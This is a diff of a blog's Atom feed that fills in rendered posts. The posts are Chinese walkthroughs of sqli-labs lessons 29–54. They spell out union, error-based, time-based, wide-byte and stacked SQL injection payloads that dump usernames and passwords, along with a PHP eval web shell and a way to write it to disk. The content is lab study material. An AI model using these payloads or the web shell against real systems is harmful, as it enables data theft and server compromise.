challenges.qlbva5vmrz),0x7e),1)–+</p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;lesson54&quot;&gt;&lt;a href=&quot;#lesson54&quot; class=&quot;headerlink&quot; title=&quot;lesson54&quot;&gt;&lt;/a&gt;lesson54&lt;/h1&gt;&lt;p&gt;一般的联合查询注入，但只有十次机会&lt;/p&gt;
+&lt;p&gt;?id=1&lt;/p&gt;
+&lt;p&gt;&lt;img src</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>lesson46_49</title>
+    <link href="http://example.com/2022/02/04/lesson46/"/>
+    <id>http://example.com/2022/02/04/lesson46/</id>
+    <published>2022-02-04T08:02:32.000Z</published>
+    <updated>2022-02-18T12:25:28.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><p>在sql语句中，asc是指定按升序排列的，desc是按降序来排列的</p><p>select * from users order by 1 desc;</p><p>select * from users order by 1 asc;</p><p>lines terminated by XXX     每一行以XXX为结尾</p><h1 id="lesson46"><a href="#lesson46" class="headerlink" title="lesson46"></a>lesson46</h1><p>提示输入sort</p><p>?sort=1</p><p><img src="https://s2.loli.net/2022/02/16/sn9aZ3S5cfvIrH1.png" alt="QQ截图20220216163248.png"></p><p>?sort=2</p><p><img src="https://s2.loli.net/2022/02/16/qwOZI6SJFV1dBiX.png" alt="QQ截图20220216163356.png"></p><p>发现sort 后面因该跟的是列数，1列就按1到14排序，2列就是a到z排序</p><p>效果跟 order by 一样</p><p>首先是用联合查询尝试，不行</p><p>然后我们尝试报错注入</p><p>?sort=3 and updatexml(1,concat(0x7e,(database())),1)–+</p><p><img src="https://s2.loli.net/2022/02/16/OuF34ZWhzHXPQUE.png" alt="QQ截图20220216165840.png"></p><p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),1)–+</p><p><img src="https://s2.loli.net/2022/02/16/UCebynZDLrsxGMO.png" alt="QQ截图20220216170022.png"></p><p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=0x7573657273)),1)–+</p><p><img src="https://s2.loli.net/2022/02/16/dCjRKtSGMlIcrhi.png" alt="QQ截图20220216170202.png"></p><p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(concat(0x7e,username,password))from security.users)),1)–+</p><p><img src="https://s2.loli.net/2022/02/16/jypbm2rFS5c8aU3.png" alt="QQ截图20220216170356.png"></p><p>方法二用时间（延迟）注入</p><p>?sort=1 and if(left(database(),1)=’s’,sleep(3),1)–+</p><p><img src="https://s2.loli.net/2022/02/16/MWC9BIljGZgcXpL.png" alt="QQ截图20220216171635.png"></p><h1 id="lesson47"><a href="#lesson47" class="headerlink" title="lesson47"></a>lesson47</h1><p>lesson47与46做法一样</p><p>就是数据包裹不同，lesson47是用单引号进行包裹的</p><p>?sort=3 and updatexml(1,concat(0x7e,(database())),1)–+</p><p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),1)–+</p><p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=0x7573657273)),1)–+</p><p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(concat(0x7e,username,password))from security.users)),1)–+</p><h1 id="lesson48"><a href="#lesson48" class="headerlink" title="lesson48"></a>lesson48</h1><p>没有报错的回显所以不能用报错注入</p><p>只能用时间(延迟)注入</p><p>?sort=1 and if(left(database(),8)=’security’,sleep(2),1)–+</p><p><img src="https://s2.loli.net/2022/02/16/g7LEVFOJdcShx28.png" alt="QQ截图20220216172801.png"></p><h1 id="lesson49"><a href="#lesson49" class="headerlink" title="lesson49"></a>lesson49</h1><p>也没有报错回显，用时间注入</p><p>?sort=1 and if(left(database(),8)=’security’,sleep(2),1)–+</p><p>?sort=1 and if(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1)=’e’,1,sleep(2))–+</p><p>?sort=1 and if(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1)=’e’,1,sleep(2))–+</p><p>?sort=1 and if(substr((select username from security.users limit 0,1),1,1)=’e’,1,sleep(2))–+</p><p>?sort=1 and if(substr((select password from security.users limit 0,1),1,1)=’e’,1,sleep(2))–+</p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;补充知识&quot;&gt;&lt;a href=&quot;#补充知识&quot; class=&quot;headerlink&quot; title=&quot;补充知识&quot;&gt;&lt;/a&gt;补充知识&lt;/h1&gt;&lt;p&gt;在sql语句中，asc是指定按升序排列的，desc是按降序来排列的&lt;/p&gt;
+&lt;p&gt;select * from users o</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>lesson42_45</title>
+    <link href="http://example.com/2022/02/03/lesson42/"/>
+    <id>http://example.com/2022/02/03/lesson42/</id>
+    <published>2022-02-03T09:17:07.000Z</published>
+    <updated>2022-02-18T12:25:38.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="lesson42"><a href="#lesson42" class="headerlink" title="lesson42"></a>lesson42</h1><p>通过检测，username这里有对当引号进行转义。而password这里没有，所以尝试对password处进行注入</p><p>在这里把type改为text就可以看到密码了</p><p><img src="https://s2.loli.net/2022/02/16/tSMjbVdgnyReNrh.png" alt="QQ截图20220216152806.png"></p><p>在password里面尝试堆叠注入</p><p>数据包裹方式为单引号</p><p>a’;create table wds5418 like users;#</p><p>虽然显示报错但是我们成功的创建了表</p><p>然后用</p><p>a’;drop table wds5418;#</p><p>来删除表</p><h1 id="lesson43"><a href="#lesson43" class="headerlink" title="lesson43"></a>lesson43</h1><p>与lesson42相同只是对数据的包裹方式不同罢了，一模一样的堆叠注入</p><p>a’);create table wds5418 like users;#</p><p>a’);drop table wds5418;#</p><h1 id="lesson44"><a href="#lesson44" class="headerlink" title="lesson44"></a>lesson44</h1><p>无回显信息的注入，注入的方法和42和43一样，payload和42一样</p><p>a’;create table wds5418 like users;#</p><p>a’;drop table wds5418;#</p><h1 id="lesson45"><a href="#lesson45" class="headerlink" title="lesson45"></a>lesson45</h1><p>也无回显的错误信息，注入方式和44关和44一样数据包裹不一样</p><p>a’);create table wds5418 like users;#</p><p>a’);drop table wds5418;#</p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>堆叠注入的题目是开放的，因为堆叠注入可以执行所以语句。</p><p>网上还有师傅用堆叠注入写入一句话木马，由此可见宽字节的危害</p><ol><li>权限</li><li>一句话木马</li><li>select XX into XXX</li><li>绝对路径</li></ol><?php @eval($_POST[wds5418]);?><p>select ‘<?php @eval($_POST[wds5418]);?>‘ into ‘绝对路径’</p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;lesson42&quot;&gt;&lt;a href=&quot;#lesson42&quot; class=&quot;headerlink&quot; title=&quot;lesson42&quot;&gt;&lt;/a&gt;lesson42&lt;/h1&gt;&lt;p&gt;通过检测，username这里有对当引号进行转义。而password这里没有，所以尝试对pa</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>lesson37_41</title>
+    <link href="http://example.com/2022/02/02/lesson37/"/>
+    <id>http://example.com/2022/02/02/lesson37/</id>
+    <published>2022-02-02T12:41:37.000Z</published>
+    <updated>2022-02-18T12:25:50.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="lesson37"><a href="#lesson37" class="headerlink" title="lesson37"></a>lesson37</h1><p>与lesson34是同种类型的 <del>替身</del> 就是处理post内容，同时包含宽字节注入</p><p>因为相同的payload和方法都能用所以我就重新打一遍</p><p>�’ union select  1,database()#</p><p>�’ union select  group_concat(table_name)from information_schema.tables where table_schema=database(),database()#</p><p>�’ union select  1,group_concat(column_name)from information_schema.columns where table_name=0x7573657273#</p><h1 id="堆叠注入（stacked-injection）"><a href="#堆叠注入（stacked-injection）" class="headerlink" title="堆叠注入（stacked injection）"></a>堆叠注入（stacked injection）</h1><p>内容参考 <a href="https://blog.csdn.net/dyw_666666/article/details/83351889?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">mysql注入天书</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在sql中，分号（；）是用来表示一条sql语句的结束。</p><p>用；连接两个句子可以让他们一起执行</p><p>联合语句和它的区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><p>lesson38 其实用单引号包裹数据的联合注入就可以做</p><p><img src="https://s2.loli.net/2022/02/15/6NIcSZq1v39HfAT.png" alt="QQ截图20220215155911.png"></p><p>但是网络上很多教程都讲了堆叠注入，所以我也提一下</p><p>堆叠注入,创一个库</p><p>?id=-1;create table wds5418 like users ;–+ </p><p><img src="https://s2.loli.net/2022/02/15/Wr8VOqluBMgPTIX.png" alt="QQ截图20220215160958.png"></p><p>在mysql命令行里发现成功创了一个库，注入成功。</p><p><img src="https://s2.loli.net/2022/02/15/vf8GrU1ze2CZFpA.png" alt="QQ截图20220215161259.png"></p><h1 id="lesson39"><a href="#lesson39" class="headerlink" title="lesson39"></a>lesson39</h1><p>无对数据进行包裹的联合注入就可以注入</p><p>?id=-1 union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><h1 id="lesson-40"><a href="#lesson-40" class="headerlink" title="lesson 40"></a>lesson 40</h1><p>没有报错的回显</p><p>用联合注入查询就可以做，因为没有错误回显，所以要多次尝试出数据包裹方式</p><p>然后就没有什么难度了</p><p>?id=-1’) union select 1,2,database()–+</p><p>?id=-1’) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p>?id=-1’) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’usrs’–+</p><p>?id=-1’) union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users–+</p><h1 id="lesson-41"><a href="#lesson-41" class="headerlink" title="lesson 41"></a>lesson 41</h1><p>同样没有报错的回显</p><p>其实没啥难度，主要花时间的是猜它的包裹方式</p><p>?id=-1 union select 1,2,database()–+</p><p>?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p>?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users–+</p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;lesson37&quot;&gt;&lt;a href=&quot;#lesson37&quot; class=&quot;headerlink&quot; title=&quot;lesson37&quot;&gt;&lt;/a&gt;lesson37&lt;/h1&gt;&lt;p&gt;与lesson34是同种类型的 &lt;del&gt;替身&lt;/del&gt; 就是处理post内容，同时包含宽</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>lesson29_31</title>
+    <link href="http://example.com/2022/02/01/lesson29/"/>
+    <id>http://example.com/2022/02/01/lesson29/</id>
+    <published>2022-02-01T11:57:27.000Z</published>
+    <updated>2022-02-18T12:28:34.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="lesson-29"><a href="#lesson-29" class="headerlink" title="lesson 29"></a>lesson 29</h1><h2 id="首先是了解服务器两层架构"><a href="#首先是了解服务器两层架构" class="headerlink" title="首先是了解服务器两层架构"></a>首先是了解服务器两层架构</h2><p>参考<a href="https://www.cnblog.com/lcamry/p/5762961.html">mysql注入天书之服务器</a></p><p>总之就是要再去搭一个jsp的平台来</p><p>同时打开phpstudy和jspstudy</p><p>通过index.jsp访问到index.php生成的页面</p><p>（buuctf里面的lesson29完全没意义，就跟lesson1一样，老坑人了，这里最好自己搭一个）</p><p><img src="https://s2.loli.net/2022/02/13/496ZE8RYbSBfMUC.png" alt="QQ截图20220213145419.png"></p><p>通过修改第一个id发现回显不会发生变化，且注入会被拦截</p><p><img src="https://s2.loli.net/2022/02/13/7Df26N8sAyEFiRe.png" alt="QQ截图20220213150822.png"></p><p>但是修改第二个id则会回显id对应的username和password，且超出数据 会报错</p><p>所以第二个id处可注入</p><p>联合查询，步骤参考lesson 1</p><p>?id=1&amp;id=-1’ union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p><img src="https://s2.loli.net/2022/02/13/9NX1JIVvGoyLdQ8.png" alt="QQ截图20220213151441.png"></p><p>?id=1&amp;id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p><img src="https://s2.loli.net/2022/02/13/IBRWVCXS9Z3LEvp.png" alt="QQ截图20220213152239.png"></p><h1 id="lesson-30"><a href="#lesson-30" class="headerlink" title="lesson 30"></a>lesson 30</h1><p>和29差不多，不过是数据的包裹变成了双引号</p><p><img src="https://s2.loli.net/2022/02/13/a4Cupvjb932Dtyl.png" alt="QQ截图20220213154154.png"></p><p>查库</p><p>?id=1&amp;id=-3”union select 1,database(),3–+</p><p>查表</p><p>?id=1&amp;id=-3”union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p>查列</p><p>?id=1&amp;id=-3”union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=’users’–+</p><p>查字段</p><p>?id=1&amp;id=-3”union select 1,database(),group_concat(concat_ws(‘@@’,username,password)) from security.users–+</p><h1 id="lesson-31"><a href="#lesson-31" class="headerlink" title="lesson 31"></a>lesson 31</h1><p>和前面一样</p><p>就是对数据的包裹变成了双引号加括号的形式</p><p>?id=1&amp;id=-3”) union select 1,2,3–+</p><p><img src="https://s2.loli.net/2022/02/13/voqCabJnfQHSrze.png" alt="QQ截图20220213155229.png"></p><p>?id=1&amp;id=-3”) union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=’security’–+</p><p>?id=1&amp;id=-3”) union select 1,database(),group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>?id=1&amp;id=-3”) union select 1,database(),group_concat(concat_ws(0x7e,username,password))from security.users–+</p>]]></content>
     
     
       
       
-    <summary type="html">{{ short_content }}</summary>
+    <summary type="html">&lt;h1 id=&quot;lesson-29&quot;&gt;&lt;a href=&quot;#lesson-29&quot; class=&quot;headerlink&quot; title=&quot;lesson 29&quot;&gt;&lt;/a&gt;lesson 29&lt;/h1&gt;&lt;h2 id=&quot;首先是了解服务器两层架构&quot;&gt;&lt;a href=&quot;#首先是了解服务器两层架构&quot;</summary>
       
     
     
     
-    <category term="{{ category.name }}" scheme="{{ category.permalink }}"/>
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
     
     
-    <category term="{{ tag.name }}" scheme="{{ tag.permalink }}"/>
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
   <entry>
-    <title>{{ post.title }}</title>
-    <link href="{{ post.permalink | uriencode }}"/>
-    <id>{{ post.permalink | uriencode }}</id>
-    <published>{{ post.date.toISOString() }}</published>
-    <updated>{{ post.updated.toISOString() }}</updated>
+    <title>lesson32_36</title>
+    <link href="http://example.com/2022/02/01/lesson32/"/>
+    <id>http://example.com/2022/02/01/lesson32/</id>
+    <published>2022-02-01T08:26:34.000Z</published>
+    <updated>2022-02-18T12:26:08.000Z</updated>
     
-    <content type="html"><![CDATA[{{ post.content | noControlChars | safe }}]]></content>
+    <content type="html"><![CDATA[<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节：GB2312、GBK、GB18030、BIG5、shift_JIS等就是常说的宽字节，实际上只有两个字节。宽字节带来的安全问题主要是ascii字符（一字节）的现象，即将两个ASCII字符误认为一个宽字节字符。中文、韩文、日文等均存在宽字节，英文默认一个字节。</p><p>在使用PHP连接MySQL的时候，当设置”set character set client + gbk”</p><p>例子：id=1‘ 处理1&#39; 进行编码 1%5c%27     带入sql后进行id=&#39; and XXX此时无法完成注入</p><p>​            id=1%df 处理1%df\进行编码1%df%5c%27  带入sql后id=1運’ andXXX此时存在宽字节注入漏洞</p><h1 id="lesson-32"><a href="#lesson-32" class="headerlink" title="lesson 32"></a>lesson 32</h1><p>观察代码</p><p><img src="https://s2.loli.net/2022/02/13/kKPURSOMbtgoqnL.png" alt="QQ截图20220213195156.png"></p><p>这段代码的作用就是在我们输入的特殊符号单引号前面加上一个\，来转意</p><p><img src="https://s2.loli.net/2022/02/13/reF8PB6OsKmxtQY.png" alt="QQ截图20220213195626.png"></p><p>宽字节注入，就是把这个转意用的\，又转意成宽字节，使我们的注入成功</p><p>在前面加上%81-%FE中可以成功转意的我们这里用%bb来举例</p><p>用联合注入</p><p>?id=-1%bb’union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p><img src="https://s2.loli.net/2022/02/13/qfJkblINeBPhDOc.png" alt="QQ截图20220213200704.png"></p><p>用字符转16进制</p><p>?id=-1%bb’union select 1,database(),group_concat(column_name)from information_schema.columns where table_name=0x7573657273–+</p><p><img src="https://s2.loli.net/2022/02/13/l7x5hP19vwikQGe.png" alt="QQ截图20220213202357.png"></p><p>?id=-1%bb’union select 1,database(),group_concat(concat_ws(0x7e,username,password))from users–+</p><h1 id="lesson-33"><a href="#lesson-33" class="headerlink" title="lesson 33"></a>lesson 33</h1><p>和lesson32差不多，应用了addslashes()函数——在双引号（预定符号）前加入反斜杠。payload也一样</p><h1 id="lesson-34"><a href="#lesson-34" class="headerlink" title="lesson 34"></a>lesson 34</h1><p>很明显的是用post进行的传参，</p><p><img src="https://s2.loli.net/2022/02/13/oLi7JbFMDvtAI5P.png" alt="QQ截图20220213221348.png"></p><p>首先burpsuite抓包拦截一下数据</p><p><img src="https://s2.loli.net/2022/02/13/gvKYQP7SGxHoMpO.png" alt="QQ截图20220213221313.png"></p><p>所以username对于uname,password对应着passwd，还有一行submit</p><p>首先对其进行单引号的包裹试探</p><p><img src="https://s2.loli.net/2022/02/13/V5iFDaQsdzeTHXp.png" alt="QQ截图20220213224544.png"></p><p>发现前面加上了\进行转义，于是乎套用宽字节注入，然而注入失败发现注入内容变成了一个之前从来没见过的符号</p><p><img src="https://s2.loli.net/2022/02/13/tEg2CMsixqSBRpL.png" alt="QQ截图20220213224833.png"></p><p>对其进行抓包来寻找问题的出处，这时发现我们的%被转意了</p><p><img src="https://s2.loli.net/2022/02/13/c3sUDNmaQzt547V.png" alt="QQ截图20220213225106.png"></p><p>于是直接对抓包内容进行修改（宽字节注入）</p><p><img src="https://s2.loli.net/2022/02/13/Ys5dtQfEj9PF3Ig.png" alt="QQ截图20220213225311.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sun, 13 Feb 2022 14:42:24 GMT</span><br><span class="line">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">X-Powered-By: PHP/5.6.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 1758</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Less-34- Bypass Add SLASHES<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;#000000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot; margin-top:20px;color:#FFF; font-size:24px; text-align:center&quot;</span>&gt;</span> Welcome<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;#FF0000&quot;</span>&gt;</span> Dhakkan <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>  <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;padding-top:10px; font-size:15px;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-top:15px; height:30px;&quot;</span>&gt;</span>Username : <span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;uname&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> Password  : <span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot; margin-top:9px;margin-left:90px;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;3&quot;</span> <span class="attr">color</span>=<span class="string">&quot;#FFFF00&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../images/Less-34.jpg&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>= <span class="string">&quot;#FFFF00&quot;</span> <span class="attr">font</span> <span class="attr">size</span> = <span class="string">4</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;3&quot;</span> <span class="attr">color</span>=<span class="string">&quot;#0000ff&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Your Login name:1<span class="tag">&lt;<span class="name">br</span>&gt;</span>Your Password:2<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../images/flag.jpg&quot;</span>  /&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 